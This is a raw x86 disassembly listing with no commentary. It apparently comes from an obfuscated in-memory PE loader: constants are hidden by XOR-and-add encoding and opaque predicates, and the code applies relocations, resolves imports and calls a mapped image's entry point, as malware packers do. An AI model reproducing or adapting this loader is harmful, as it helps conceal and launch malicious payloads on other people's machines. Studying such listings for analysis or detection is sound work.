  4132a4:	mov    eax,DWORD PTR [ebp+0x8]
  4132a7:	mov    BYTE PTR [ecx+0x9],0xe
  4132ab:	mov    BYTE PTR [eax+0x7],0x47
  4132af:	mov    BYTE PTR [ecx+0x6],0xf
  4132b3:	mov    BYTE PTR [ecx+0x3],0x1e
  4132b7:	leave  
  4132b8:	ret    0x4
  4132bb:	push   ebp
  4132bc:	mov    ebp,esp
  4132be:	push   ecx
  4132bf:	push   ecx
  4132c0:	lea    eax,[ebp-0x8]
  4132c3:	mov    DWORD PTR [ebp-0x4],eax
  4132c6:	mov    edx,DWORD PTR [ebp-0x4]
  4132c9:	mov    eax,0x7e0da0f
  4132ce:	mov    DWORD PTR [edx],eax
  4132d0:	mov    edx,DWORD PTR [ebp-0x8]
  4132d3:	cmp    edx,eax
  4132d5:	jne    0x4132db
  4132d7:	mov    BYTE PTR [ecx+0x7],0x47
  4132db:	mov    eax,DWORD PTR [ebp+0x8]
  4132de:	mov    BYTE PTR [ecx+0x1],0x5
  4132e2:	mov    BYTE PTR [eax+0x9],0x2e
  4132e6:	leave  
  4132e7:	ret    0x4
  4132ea:	push   ebp
  4132eb:	mov    ebp,esp
  4132ed:	push   ecx
  4132ee:	push   ecx
  4132ef:	lea    eax,[ebp-0x8]
  4132f2:	mov    DWORD PTR [ebp-0x4],eax
  4132f5:	push   esi
  4132f6:	mov    esi,DWORD PTR [ebp-0x4]
  4132f9:	mov    eax,0x7060e3c
  4132fe:	mov    DWORD PTR [esi],eax
  413300:	mov    esi,DWORD PTR [ebp-0x8]
  413303:	cmp    esi,eax
  413305:	pop    esi
  413306:	jne    0x413312
  413308:	mov    BYTE PTR [edx+0x4],0xb
  41330c:	mov    WORD PTR [ecx+0x3],0xb1e
  413312:	mov    BYTE PTR [edx],0x3f
  413315:	leave  
  413316:	ret    
  413317:	push   ebp
  413318:	mov    ebp,esp
  41331a:	push   ecx
  41331b:	push   ecx
  41331c:	lea    eax,[ebp-0x8]
  41331f:	mov    DWORD PTR [ebp-0x4],eax
  413322:	mov    edx,DWORD PTR [ebp-0x4]
  413325:	mov    eax,0xf8870b3f
  41332a:	mov    DWORD PTR [edx],eax
  41332c:	mov    edx,DWORD PTR [ebp-0x8]
  41332f:	cmp    edx,eax
  413331:	jne    0x41333e
  413333:	mov    eax,DWORD PTR [ebp+0x8]
  413336:	mov    BYTE PTR [ecx+0x8],0xf
  41333a:	mov    BYTE PTR [eax+0x1],0x5
  41333e:	mov    BYTE PTR [ecx+0x5],0xf3
  413342:	leave  
  413343:	ret    0x4
  413346:	push   esi
  413347:	mov    ecx,edi
  413349:	call   0x413317
  41334e:	mov    edx,edi
  413350:	mov    ecx,esi
  413352:	mov    BYTE PTR [esi],0x1f
  413355:	call   0x4132ea
  41335a:	push   esi
  41335b:	mov    ecx,edi
  41335d:	mov    BYTE PTR [esi+0x5],0xf3
  413361:	call   0x4132bb
  413366:	push   esi
  413367:	mov    BYTE PTR [esi+0x6],0xf
  41336b:	call   0x413288
  413370:	mov    BYTE PTR [esi+0x2],0x8
  413374:	mov    edx,esi
  413376:	jmp    0x413258
  41337b:	push   ebp
  41337c:	mov    ebp,esp
  41337e:	push   ecx
  41337f:	mov    ecx,DWORD PTR [edx+0x194]
  413385:	push   esi
  413386:	mov    esi,DWORD PTR [ebp+0x8]
  413389:	mov    esi,DWORD PTR [esi]
  41338b:	mov    DWORD PTR [ecx],esi
  41338d:	mov    ecx,DWORD PTR [edx+0x194]
  413393:	mov    ecx,DWORD PTR [ecx]
  413395:	mov    esi,DWORD PTR [edx+0x190]
  41339b:	mov    DWORD PTR [esi],ecx
  41339d:	mov    eax,DWORD PTR [edx+0x194]
  4133a3:	mov    ecx,DWORD PTR [eax]
  4133a5:	mov    ecx,DWORD PTR [ecx+0x3c]
  4133a8:	add    ecx,DWORD PTR [eax]
  4133aa:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  4133b1:	mov    eax,DWORD PTR [ebp-0x4]
  4133b4:	movzx  ecx,WORD PTR [ecx+0x16]
  4133b8:	xor    eax,0x7510896
  4133bd:	add    eax,0x3272dd
  4133c2:	pop    esi
  4133c3:	test   ecx,eax
  4133c5:	je     0x4133d3
  4133c7:	mov    eax,DWORD PTR [edx+0x1c8]
  4133cd:	mov    DWORD PTR [eax],0xf89c85b2
  4133d3:	leave  
  4133d4:	ret    0x4
  4133d7:	push   ebp
  4133d8:	mov    ebp,esp
  4133da:	sub    esp,0x70
  4133dd:	and    DWORD PTR [ebp-0x20],0x0
  4133e1:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  4133e8:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4133ef:	mov    DWORD PTR [ebp-0x2c],0xf89c85b1
  4133f6:	mov    DWORD PTR [ebp-0x14],0xf89c85b3
  4133fd:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  413404:	mov    eax,DWORD PTR [ebp+0x20]
  413407:	mov    eax,DWORD PTR [eax+0x194]
  41340d:	mov    DWORD PTR [ebp-0xc],eax
  413410:	mov    eax,DWORD PTR [ebp+0x20]
  413413:	push   ebx
  413414:	push   esi
  413415:	mov    esi,DWORD PTR [eax+0x190]
  41341b:	mov    eax,DWORD PTR [ebp+0x20]
  41341e:	mov    eax,DWORD PTR [eax+0x18c]
  413424:	mov    DWORD PTR [ebp-0x8],eax
  413427:	mov    eax,DWORD PTR [eax]
  413429:	push   edi
  41342a:	mov    DWORD PTR [ebp-0x4],esi
  41342d:	test   eax,eax
  41342f:	jne    0x41343c
  413431:	push   DWORD PTR [ebp+0x1c]
  413434:	mov    edx,DWORD PTR [ebp+0x20]
  413437:	call   0x41337b
  41343c:	mov    eax,DWORD PTR [esi]
  41343e:	mov    ebx,DWORD PTR [esi]
  413440:	add    ebx,DWORD PTR [eax+0x3c]
  413443:	mov    eax,DWORD PTR [ebp+0xc]
  413446:	mov    ecx,DWORD PTR [ebp-0x8]
  413449:	mov    ecx,DWORD PTR [ecx]
  41344b:	mov    esi,0x7510896
  413450:	xor    eax,esi
  413452:	mov    edi,0x3272dd
  413457:	add    eax,edi
  413459:	cmp    eax,ecx
  41345b:	jne    0x413693
  413461:	mov    eax,DWORD PTR [ebp-0xc]
  413464:	mov    eax,DWORD PTR [eax]
  413466:	mov    DWORD PTR [ebp-0x10],eax
  413469:	mov    eax,DWORD PTR [ebx+0x50]
  41346c:	mov    DWORD PTR [ebp-0x68],eax
  41346f:	mov    eax,DWORD PTR [ebp-0x18]
  413472:	xor    eax,esi
  413474:	add    eax,edi
  413476:	mov    DWORD PTR [ebp-0x64],eax
  413479:	mov    eax,DWORD PTR [ebp-0x14]
  41347c:	and    DWORD PTR [ebp-0x6c],0x0
  413480:	xor    eax,esi
  413482:	add    eax,edi
  413484:	mov    DWORD PTR [ebp-0x60],eax
  413487:	lea    eax,[ebp-0x70]
  41348a:	push   eax
  41348b:	mov    eax,DWORD PTR [ebp+0x8]
  41348e:	xor    eax,esi
  413490:	add    eax,edi
  413492:	push   eax
  413493:	mov    eax,DWORD PTR [ebp+0x20]
  413496:	add    eax,0xaa
  41349b:	push   eax
  41349c:	mov    eax,DWORD PTR [ebp+0x20]
  41349f:	mov    eax,DWORD PTR [eax+0x198]
  4134a5:	mov    DWORD PTR [ebp-0x70],0x4
  4134ac:	push   DWORD PTR [eax]
  4134ae:	mov    eax,DWORD PTR [ebp+0x10]
  4134b1:	call   eax
  4134b3:	mov    ecx,DWORD PTR [ebp-0xc]
  4134b6:	mov    ecx,DWORD PTR [ecx]
  4134b8:	mov    edx,DWORD PTR [ebp-0x8]
  4134bb:	mov    DWORD PTR [ebp-0x6c],eax
  4134be:	mov    DWORD PTR [ebp+0x1c],eax
  4134c1:	mov    DWORD PTR [edx],ecx
  4134c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4134c6:	mov    DWORD PTR [ecx],eax
  4134c8:	mov    eax,DWORD PTR [ebx+0x50]
  4134cb:	mov    DWORD PTR [ebp-0x68],eax
  4134ce:	mov    eax,DWORD PTR [ebp-0x1c]
  4134d1:	xor    eax,esi
  4134d3:	add    eax,edi
  4134d5:	mov    DWORD PTR [ebp-0x64],eax
  4134d8:	lea    eax,[ebp-0x20]
  4134db:	mov    DWORD PTR [ebp-0x60],eax
  4134de:	lea    eax,[ebp-0x70]
  4134e1:	push   eax
  4134e2:	mov    eax,DWORD PTR [ebp+0x8]
  4134e5:	xor    eax,esi
  4134e7:	add    eax,edi
  4134e9:	push   eax
  4134ea:	mov    eax,DWORD PTR [ebp+0x20]
  4134ed:	add    eax,0xee
  4134f2:	push   eax
  4134f3:	mov    eax,DWORD PTR [ebp+0x20]
  4134f6:	mov    eax,DWORD PTR [eax+0x198]
  4134fc:	mov    DWORD PTR [ebp-0x70],0x4
  413503:	push   DWORD PTR [eax]
  413505:	mov    eax,DWORD PTR [ebp+0x10]
  413508:	call   eax
  41350a:	test   eax,eax
  41350c:	je     0x413531
  41350e:	and    DWORD PTR [ebp+0xc],0x0
  413512:	cmp    DWORD PTR [ebx+0x50],0x0
  413516:	jbe    0x413531
  413518:	mov    eax,DWORD PTR [ebp+0x1c]
  41351b:	mov    ecx,DWORD PTR [ebp-0x10]
  41351e:	sub    ecx,eax
  413520:	mov    dl,BYTE PTR [ecx+eax*1]
  413523:	inc    DWORD PTR [ebp+0xc]
  413526:	mov    BYTE PTR [eax],dl
  413528:	mov    edx,DWORD PTR [ebp+0xc]
  41352b:	inc    eax
  41352c:	cmp    edx,DWORD PTR [ebx+0x50]
  41352f:	jb     0x413520
  413531:	mov    edx,DWORD PTR [ebp+0x1c]
  413534:	mov    ecx,DWORD PTR [edx+0x3c]
  413537:	add    ecx,edx
  413539:	mov    eax,DWORD PTR [ecx+0xa0]
  41353f:	mov    ebx,DWORD PTR [ecx+0x28]
  413542:	add    eax,edx
  413544:	sub    edx,DWORD PTR [ebp-0x10]
  413547:	add    ebx,DWORD PTR [ebp+0x1c]
  41354a:	mov    DWORD PTR [ebp+0xc],edx
  41354d:	mov    DWORD PTR [ebp-0x2c],ecx
  413550:	mov    DWORD PTR [ebp-0x14],ebx
  413553:	mov    DWORD PTR [ebp-0x8],0x0
  41355a:	jmp    0x4135d6
  41355c:	add    edx,0xfffffff8
  41355f:	shr    edx,1
  413561:	mov    DWORD PTR [ebp-0x18],edx
  413564:	je     0x4135c2
  413566:	lea    edx,[eax+0x8]
  413569:	mov    DWORD PTR [ebp-0x4],edx
  41356c:	mov    edx,DWORD PTR [ebp-0x18]
  41356f:	mov    DWORD PTR [ebp-0x18],edx
  413572:	mov    edx,DWORD PTR [ebp-0x4]
  413575:	movzx  edx,WORD PTR [edx]
  413578:	mov    DWORD PTR [ebp-0x24],edx
  41357b:	and    edx,0xfff
  413581:	mov    DWORD PTR [ebp-0x28],edx
  413584:	mov    edx,DWORD PTR [ebp-0x24]
  413587:	shr    edx,0xc
  41358a:	add    edx,0xffcd8d23
  413590:	xor    edx,esi
  413592:	cmp    edx,0xf89c85b0
  413598:	jne    0x4135b9
  41359a:	mov    edx,DWORD PTR [ebp-0x28]
  41359d:	add    edx,DWORD PTR [ebp+0x1c]
  4135a0:	mov    ebx,DWORD PTR [eax]
  4135a2:	cmp    DWORD PTR [ebx+edx*1],0x0
  4135a6:	je     0x4135b6
  4135a8:	mov    ecx,DWORD PTR [ebp+0xc]
  4135ab:	add    ecx,DWORD PTR [ebx+edx*1]
  4135ae:	mov    ebx,DWORD PTR [eax]
  4135b0:	mov    DWORD PTR [edx+ebx*1],ecx
  4135b3:	mov    ecx,DWORD PTR [ebp-0x2c]
  4135b6:	mov    ebx,DWORD PTR [ebp-0x14]
  4135b9:	add    DWORD PTR [ebp-0x4],0x2
  4135bd:	dec    DWORD PTR [ebp-0x18]
  4135c0:	jne    0x413572
  4135c2:	mov    edx,DWORD PTR [ebp-0xc]
  4135c5:	add    DWORD PTR [ebp-0x8],edx
  4135c8:	mov    edx,DWORD PTR [ebp-0x8]
  4135cb:	cmp    edx,DWORD PTR [ecx+0xa4]
  4135d1:	jae    0x4135e4
  4135d3:	add    eax,DWORD PTR [ebp-0xc]
  4135d6:	mov    edx,DWORD PTR [eax+0x4]
  4135d9:	mov    DWORD PTR [ebp-0xc],edx
  4135dc:	test   edx,edx
  4135de:	jne    0x41355c
  4135e4:	mov    eax,DWORD PTR [ebp-0x10]
  4135e7:	mov    DWORD PTR [ebp-0x6c],eax
  4135ea:	mov    DWORD PTR [ebp-0x70],0x4
  4135f1:	mov    eax,DWORD PTR [ecx+0x50]
  4135f4:	mov    DWORD PTR [ebp-0x68],eax
  4135f7:	mov    eax,DWORD PTR [ebp-0x1c]
  4135fa:	xor    eax,esi
  4135fc:	add    eax,edi
  4135fe:	mov    DWORD PTR [ebp-0x64],eax
  413601:	lea    eax,[ebp-0x20]
  413604:	mov    DWORD PTR [ebp-0x60],eax
  413607:	lea    eax,[ebp-0x70]
  41360a:	push   eax
  41360b:	mov    eax,DWORD PTR [ebp+0x8]
  41360e:	xor    eax,esi
  413610:	add    eax,edi
  413612:	push   eax
  413613:	mov    eax,DWORD PTR [ebp+0x20]
  413616:	add    eax,0xee
  41361b:	push   eax
  41361c:	mov    eax,DWORD PTR [ebp+0x20]
  41361f:	mov    eax,DWORD PTR [eax+0x198]
  413625:	push   DWORD PTR [eax]
  413627:	mov    eax,DWORD PTR [ebp+0x10]
  41362a:	call   eax
  41362c:	mov    eax,DWORD PTR [ebp+0x20]
  41362f:	mov    eax,DWORD PTR [eax+0x180]
  413635:	add    eax,DWORD PTR [ebp+0xc]
  413638:	mov    ecx,DWORD PTR [ebp+0xc]
  41363b:	push   DWORD PTR [ebp+0x18]
  41363e:	mov    DWORD PTR [eax],ecx
  413640:	push   DWORD PTR [ebp+0x14]
  413643:	push   DWORD PTR [ebp+0x1c]
  413646:	call   ebx
  413648:	mov    eax,DWORD PTR [ebp+0xc]
  41364b:	add    eax,DWORD PTR [ebp+0x20]
  41364e:	lea    ecx,[ebp+0x4]
  413651:	mov    DWORD PTR [ebp+0x20],eax
  413654:	mov    eax,DWORD PTR [ebp+0x20]
  413657:	mov    eax,DWORD PTR [ebp+0x20]
  41365a:	mov    edx,DWORD PTR [eax+0x190]
  413660:	mov    eax,DWORD PTR [ebp+0x20]
  413663:	mov    eax,DWORD PTR [eax+0x18c]
  413669:	mov    esi,DWORD PTR [eax]
  41366b:	cmp    DWORD PTR [ecx],esi
  41366d:	jb     0x41368e
  41366f:	mov    esi,DWORD PTR [edx]
  413671:	mov    edi,DWORD PTR [edx]
  413673:	mov    esi,DWORD PTR [esi+0x3c]
  413676:	lea    esi,[edi+esi*1+0x50]
  41367a:	mov    edi,DWORD PTR [eax]
  41367c:	add    edi,DWORD PTR [esi]
  41367e:	cmp    DWORD PTR [ecx],edi
  413680:	jae    0x41368e
  413682:	mov    esi,DWORD PTR [eax]
  413684:	mov    eax,DWORD PTR [ecx]
  413686:	mov    edx,DWORD PTR [edx]
  413688:	sub    eax,esi
  41368a:	add    edx,eax
  41368c:	mov    DWORD PTR [ecx],edx
  41368e:	mov    eax,DWORD PTR [ebp+0xc]
  413691:	jmp    0x4136d4
  413693:	push   DWORD PTR [ebp+0x20]
  413696:	call   0x412804
  41369b:	mov    eax,DWORD PTR [ebp+0x20]
  41369e:	mov    eax,DWORD PTR [eax+0x1c8]
  4136a4:	mov    eax,DWORD PTR [eax]
  4136a6:	xor    eax,esi
  4136a8:	add    eax,edi
  4136aa:	mov    eax,DWORD PTR [ebp+0x20]
  4136ad:	jne    0x4136c5
  4136af:	mov    ecx,DWORD PTR [ebp+0x20]
  4136b2:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4136b8:	push   DWORD PTR [ecx]
  4136ba:	mov    eax,DWORD PTR [eax+0x1d8]
  4136c0:	call   DWORD PTR [eax+0x28]
  4136c3:	jmp    0x4136d2
  4136c5:	mov    eax,DWORD PTR [eax+0x17c]
  4136cb:	mov    ecx,DWORD PTR [eax]
  4136cd:	lea    eax,[ebp+0x4]
  4136d0:	add    DWORD PTR [eax],ecx
  4136d2:	xor    eax,eax
  4136d4:	pop    edi
  4136d5:	pop    esi
  4136d6:	pop    ebx
  4136d7:	leave  
  4136d8:	ret    0x1c
  4136db:	push   ebp
  4136dc:	mov    ebp,esp
  4136de:	sub    esp,0x1c
  4136e1:	push   esi
  4136e2:	mov    esi,eax
  4136e4:	mov    eax,DWORD PTR [ecx+0x190]
  4136ea:	cmp    DWORD PTR [eax],0x0
  4136ed:	je     0x4137fd
  4136f3:	test   edx,edx
  4136f5:	je     0x4137fd
  4136fb:	test   esi,esi
  4136fd:	je     0x4137fd
  413703:	mov    eax,DWORD PTR [esi+0x88]
  413709:	test   eax,eax
  41370b:	je     0x4137f8
  413711:	cmp    DWORD PTR [esi+0x8c],0x10
  413718:	je     0x4137f8
  41371e:	cmp    DWORD PTR [esi+0x34],edx
  413721:	je     0x4137f8
  413727:	mov    esi,DWORD PTR [ecx+0x18c]
  41372d:	and    DWORD PTR [ebp-0x10],0x0
  413731:	mov    ecx,edx
  413733:	sub    ecx,DWORD PTR [esi]
  413735:	add    eax,edx
  413737:	movzx  edx,WORD PTR [eax+0xc]
  41373b:	mov    DWORD PTR [ebp-0x1c],ecx
  41373e:	movzx  ecx,WORD PTR [eax+0xe]
  413742:	add    ecx,edx
  413744:	je     0x4137f8
  41374a:	lea    ecx,[eax+0x14]
  41374d:	push   ebx
  41374e:	mov    DWORD PTR [ebp-0x18],ecx
  413751:	mov    esi,0x7fffffff
  413756:	push   edi
  413757:	test   DWORD PTR [ecx],esi
  413759:	je     0x4137da
  41375b:	mov    edx,DWORD PTR [ecx]
  41375d:	and    DWORD PTR [ebp-0xc],0x0
  413761:	and    edx,esi
  413763:	add    edx,eax
  413765:	movzx  edi,WORD PTR [edx+0xe]
  413769:	movzx  ebx,WORD PTR [edx+0xc]
  41376d:	add    edi,ebx
  41376f:	je     0x4137da
  413771:	lea    ecx,[edx+0x14]
  413774:	mov    DWORD PTR [ebp-0x14],ecx
  413777:	test   DWORD PTR [ecx],esi
  413779:	je     0x4137bc
  41377b:	mov    ecx,DWORD PTR [ecx]
  41377d:	and    DWORD PTR [ebp-0x8],0x0
  413781:	and    ecx,esi
  413783:	add    ecx,eax
  413785:	movzx  edi,WORD PTR [ecx+0xe]
  413789:	movzx  ebx,WORD PTR [ecx+0xc]
  41378d:	add    edi,ebx
  41378f:	je     0x4137bc
  413791:	lea    edi,[ecx+0x14]
  413794:	mov    DWORD PTR [ebp-0x4],edi
  413797:	mov    edi,DWORD PTR [ebp-0x4]
  41379a:	mov    edi,DWORD PTR [edi]
  41379c:	test   edi,edi
  41379e:	je     0x4137a6
  4137a0:	mov    ebx,DWORD PTR [ebp-0x1c]
  4137a3:	add    DWORD PTR [edi+eax*1],ebx
  4137a6:	movzx  edi,WORD PTR [ecx+0xe]
  4137aa:	movzx  ebx,WORD PTR [ecx+0xc]
  4137ae:	inc    DWORD PTR [ebp-0x8]
  4137b1:	add    DWORD PTR [ebp-0x4],0x8
  4137b5:	add    edi,ebx
  4137b7:	cmp    DWORD PTR [ebp-0x8],edi
  4137ba:	jb     0x413797
  4137bc:	movzx  edi,WORD PTR [edx+0xe]
  4137c0:	movzx  ebx,WORD PTR [edx+0xc]
  4137c4:	mov    ecx,DWORD PTR [ebp-0x14]
  4137c7:	inc    DWORD PTR [ebp-0xc]
  4137ca:	add    ecx,0x8
  4137cd:	add    edi,ebx
  4137cf:	mov    DWORD PTR [ebp-0x14],ecx
  4137d2:	cmp    DWORD PTR [ebp-0xc],edi
  4137d5:	jb     0x413777
  4137d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4137da:	movzx  edx,WORD PTR [eax+0xe]
  4137de:	movzx  edi,WORD PTR [eax+0xc]
  4137e2:	inc    DWORD PTR [ebp-0x10]
  4137e5:	add    ecx,0x8
  4137e8:	add    edx,edi
  4137ea:	mov    DWORD PTR [ebp-0x18],ecx
  4137ed:	cmp    DWORD PTR [ebp-0x10],edx
  4137f0:	jb     0x413757
  4137f6:	pop    edi
  4137f7:	pop    ebx
  4137f8:	xor    eax,eax
  4137fa:	inc    eax
  4137fb:	jmp    0x4137ff
  4137fd:	xor    eax,eax
  4137ff:	pop    esi
  413800:	leave  
  413801:	ret    
  413802:	push   ebp
  413803:	mov    ebp,esp
  413805:	mov    ecx,DWORD PTR [ecx+0x190]
  41380b:	mov    eax,DWORD PTR [ebp+0xc]
  41380e:	sub    esp,0x10
  413811:	push   ebx
  413812:	xor    ebx,ebx
  413814:	push   esi
  413815:	push   edi
  413816:	cmp    DWORD PTR [ecx],ebx
  413818:	je     0x4138a0
  41381e:	cmp    eax,ebx
  413820:	je     0x4138a0
  413822:	cmp    DWORD PTR [eax+0x78],ebx
  413825:	jne    0x41382c
  413827:	xor    eax,eax
  413829:	inc    eax
  41382a:	jmp    0x4138a2
  41382c:	mov    eax,DWORD PTR [eax+0x78]
  41382f:	add    eax,DWORD PTR [ebp+0x8]
  413832:	mov    ecx,DWORD PTR [eax+0x1c]
  413835:	mov    edx,DWORD PTR [eax+0x24]
  413838:	mov    esi,DWORD PTR [eax+0x14]
  41383b:	mov    edi,DWORD PTR [eax+0x18]
  41383e:	add    ecx,DWORD PTR [ebp+0x8]
  413841:	add    edx,DWORD PTR [ebp+0x8]
  413844:	mov    DWORD PTR [ebp-0x4],esi
  413847:	cmp    esi,edi
  413849:	ja     0x41384e
  41384b:	mov    DWORD PTR [ebp-0x4],edi
  41384e:	mov    DWORD PTR [ebp-0x8],ebx
  413851:	cmp    DWORD PTR [ebp-0x4],ebx
  413854:	jbe    0x413827
  413856:	cmp    ebx,DWORD PTR [eax+0x14]
  413859:	jae    0x413861
  41385b:	movzx  esi,WORD PTR [edx+ebx*2]
  41385f:	jmp    0x413863
  413861:	mov    esi,ebx
  413863:	lea    esi,[ecx+esi*4]
  413866:	mov    edi,DWORD PTR [esi]
  413868:	test   edi,edi
  41386a:	je     0x413895
  41386c:	add    edi,DWORD PTR [ebp+0x8]
  41386f:	mov    DWORD PTR [ebp-0x10],edi
  413872:	cmp    edi,eax
  413874:	jbe    0x413886
  413876:	mov    ebx,DWORD PTR [ebp+0xc]
  413879:	mov    ebx,DWORD PTR [ebx+0x7c]
  41387c:	add    ebx,eax
  41387e:	cmp    edi,ebx
  413880:	jae    0x413886
  413882:	mov    esi,DWORD PTR [esi]
  413884:	jmp    0x41388e
  413886:	sub    edi,DWORD PTR [ebp+0x8]
  413889:	mov    DWORD PTR [esi],edi
  41388b:	mov    esi,DWORD PTR [ebp-0x10]
  41388e:	test   esi,esi
  413890:	je     0x4138a0
  413892:	mov    ebx,DWORD PTR [ebp-0x8]
  413895:	inc    ebx
  413896:	mov    DWORD PTR [ebp-0x8],ebx
  413899:	cmp    ebx,DWORD PTR [ebp-0x4]
  41389c:	jb     0x413856
  41389e:	jmp    0x413827
  4138a0:	xor    eax,eax
  4138a2:	pop    edi
  4138a3:	pop    esi
  4138a4:	pop    ebx
  4138a5:	leave  
  4138a6:	ret    0x8
  4138a9:	push   ebp
  4138aa:	mov    ebp,esp
  4138ac:	sub    esp,0x2c
  4138af:	mov    edx,0xf89c85b5
  4138b4:	mov    DWORD PTR [ebp-0x4],edx
  4138b7:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  4138be:	mov    eax,DWORD PTR [ebp-0x4]
  4138c1:	mov    ecx,DWORD PTR [ebp-0x4]
  4138c4:	mov    ecx,DWORD PTR [ebp-0x4]
  4138c7:	mov    ecx,DWORD PTR [ebp-0x4]
  4138ca:	mov    ecx,DWORD PTR [ebp-0x4]
  4138cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4138d0:	push   ebx
  4138d1:	mov    ebx,DWORD PTR [ebp+0x10]
  4138d4:	push   esi
  4138d5:	mov    esi,0x7510896
  4138da:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  4138e1:	mov    ecx,DWORD PTR [ebp-0x4]
  4138e4:	mov    ebx,DWORD PTR [ebx+0x190]
  4138ea:	push   edi
  4138eb:	mov    edi,0x3272dd
  4138f0:	xor    ecx,esi
  4138f2:	xor    eax,esi
  4138f4:	add    eax,edi
  4138f6:	add    ecx,edi
  4138f8:	mov    DWORD PTR [ebp-0x18],eax
  4138fb:	cmp    ecx,DWORD PTR [ebx]
  4138fd:	je     0x413b7e
  413903:	mov    ebx,DWORD PTR [ebp-0x4]
  413906:	mov    ecx,DWORD PTR [ebp+0xc]
  413909:	xor    ebx,esi
  41390b:	add    ebx,edi
  41390d:	cmp    ebx,ecx
  41390f:	je     0x413b7e
  413915:	mov    ebx,DWORD PTR [ebp-0x4]
  413918:	mov    ecx,DWORD PTR [ecx+0x80]
  41391e:	xor    ebx,esi
  413920:	add    ebx,edi
  413922:	cmp    ecx,ebx
  413924:	je     0x413b79
  41392a:	add    ecx,DWORD PTR [ebp+0x8]
  41392d:	mov    DWORD PTR [ebp-0x2c],ecx
  413930:	mov    ebx,edx
  413932:	xor    ebx,esi
  413934:	add    ebx,edi
  413936:	mov    DWORD PTR [ebp-0x10],ebx
  413939:	mov    ebx,DWORD PTR [ebp-0x10]
  41393c:	cmp    ebx,edx
  41393e:	je     0x413952
  413940:	mov    edx,DWORD PTR [ebp-0x10]
  413943:	mov    ebx,DWORD PTR [ebp-0x4]
  413946:	imul   edx,edx,0x14
  413949:	xor    ebx,esi
  41394b:	add    ebx,edi
  41394d:	cmp    DWORD PTR [edx+ecx*1],ebx
  413950:	jne    0x413969
  413952:	mov    edx,DWORD PTR [ebp-0x10]
  413955:	mov    ebx,DWORD PTR [ebp-0x4]
  413958:	imul   edx,edx,0x14
  41395b:	xor    ebx,esi
  41395d:	add    ebx,edi
  41395f:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  413963:	je     0x413b6b
  413969:	mov    eax,DWORD PTR [ebp-0x4]
  41396c:	mov    ebx,DWORD PTR [ebp-0x4]
  41396f:	mov    eax,DWORD PTR [ebp-0x10]
  413972:	imul   eax,eax,0x14
  413975:	add    eax,ecx
  413977:	mov    ecx,DWORD PTR [eax+0x10]
  41397a:	add    ecx,DWORD PTR [ebp+0x8]
  41397d:	xor    ebx,esi
  41397f:	mov    DWORD PTR [ebp-0x1c],ecx
  413982:	mov    ecx,DWORD PTR [ebp-0x4]
  413985:	mov    edx,DWORD PTR [ebp-0x4]
  413988:	xor    ecx,esi
  41398a:	add    ecx,edi
  41398c:	xor    edx,esi
  41398e:	mov    DWORD PTR [ebp-0x24],ecx
  413991:	mov    ecx,DWORD PTR [eax]
  413993:	add    edx,edi
  413995:	add    ebx,edi
  413997:	cmp    ecx,edx
  413999:	je     0x4139a1
  41399b:	add    ecx,DWORD PTR [ebp+0x8]
  41399e:	mov    DWORD PTR [ebp-0x24],ecx
  4139a1:	mov    ecx,DWORD PTR [ebp-0x4]
  4139a4:	xor    ecx,esi
  4139a6:	add    ecx,DWORD PTR [eax+0xc]
  4139a9:	mov    eax,DWORD PTR [ebp+0x8]
  4139ac:	lea    eax,[ecx+eax*1+0x3272dd]
  4139b3:	mov    DWORD PTR [ebp+0xc],eax
  4139b6:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  4139bd:	mov    eax,DWORD PTR [ebp+0x10]
  4139c0:	push   DWORD PTR [ebp+0xc]
  4139c3:	mov    eax,DWORD PTR [eax+0x1d8]
  4139c9:	call   DWORD PTR [eax]
  4139cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4139ce:	xor    ecx,esi
  4139d0:	add    ecx,edi
  4139d2:	mov    DWORD PTR [ebp-0xc],eax
  4139d5:	cmp    ecx,eax
  4139d7:	jne    0x4139eb
  4139d9:	mov    eax,DWORD PTR [ebp+0x10]
  4139dc:	push   DWORD PTR [ebp+0xc]
  4139df:	mov    eax,DWORD PTR [eax+0x1d8]
  4139e5:	call   DWORD PTR [eax+0xc]
  4139e8:	mov    DWORD PTR [ebp-0xc],eax
  4139eb:	mov    DWORD PTR [ebp-0x20],0x7f661b0a
  4139f2:	mov    DWORD PTR [ebp-0x20],0xf89c999a
  4139f9:	mov    eax,DWORD PTR [ebp-0x4]
  4139fc:	xor    eax,esi
  4139fe:	add    eax,edi
  413a00:	cmp    eax,DWORD PTR [ebp-0xc]
  413a03:	jne    0x413a28
  413a05:	mov    eax,DWORD PTR [ebp-0x8]
  413a08:	mov    ecx,DWORD PTR [ebp-0x20]
  413a0b:	xor    eax,esi
  413a0d:	xor    ecx,esi
  413a0f:	lea    ebx,[ebx+eax*1+0x3272dd]
  413a16:	mov    eax,DWORD PTR [ebp+0x10]
  413a19:	mov    eax,DWORD PTR [eax+0x1d8]
  413a1f:	add    ecx,edi
  413a21:	imul   ecx,ebx
  413a24:	push   ecx
  413a25:	call   DWORD PTR [eax+0x24]
  413a28:	mov    eax,DWORD PTR [ebp-0x4]
  413a2b:	xor    eax,esi
  413a2d:	add    eax,edi
  413a2f:	cmp    eax,DWORD PTR [ebp-0xc]
  413a32:	jne    0x413a43
  413a34:	mov    eax,DWORD PTR [ebp-0x28]
  413a37:	xor    eax,esi
  413a39:	add    eax,edi
  413a3b:	cmp    ebx,eax
  413a3d:	jbe    0x4139bd
  413a43:	mov    eax,DWORD PTR [ebp-0x4]
  413a46:	xor    eax,esi
  413a48:	add    eax,edi
  413a4a:	cmp    eax,DWORD PTR [ebp-0xc]
  413a4d:	jne    0x413a66
  413a4f:	mov    eax,DWORD PTR [ebp-0x8]
  413a52:	mov    ecx,DWORD PTR [ebp-0x18]
  413a55:	xor    eax,esi
  413a57:	lea    eax,[ecx+eax*1+0x3272dd]
  413a5e:	mov    DWORD PTR [ebp-0x18],eax
  413a61:	jmp    0x413b55
  413a66:	mov    DWORD PTR [ebp-0x14],0x1121b0d
